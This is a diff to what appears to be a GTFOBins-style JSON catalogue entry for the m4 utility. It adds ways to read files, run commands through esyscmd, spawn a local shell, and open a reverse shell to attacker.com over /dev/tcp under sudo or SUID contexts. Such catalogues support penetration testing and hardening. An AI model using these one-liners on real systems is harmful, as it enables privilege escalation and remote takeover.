@@ -4,6 +4,15 @@
       {
         "description": "",
         "code": "LFILE=file_to_read\nm4 \"$LFILE\"\n"
+      },
+      {
+        "binary": false,
+        "code": "m4 /path/to/input-file\n",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
       }
     ],
     "suid": [
@@ -16,6 +25,34 @@
       {
         "description": "",
         "code": "LFILE=file_to_read\nsudo m4 \"$LFILE\"\n"
+      }
+    ],
+    "command": [
+      {
+        "code": "echo 'esyscmd(/path/to/command)' | m4\n",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
+      }
+    ],
+    "reverse-shell": [
+      {
+        "code": "echo 'esyscmd(/bin/sh -i >& /dev/tcp/attacker.com/12345 0>&1)' | m4\n",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        },
+        "listener": "tcp-server"
+      }
+    ],
+    "shell": [
+      {
+        "code": "echo 'esyscmd(/bin/sh </dev/tty >/dev/tty 2>&1)' | m4\n",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
       }
     ]
   }
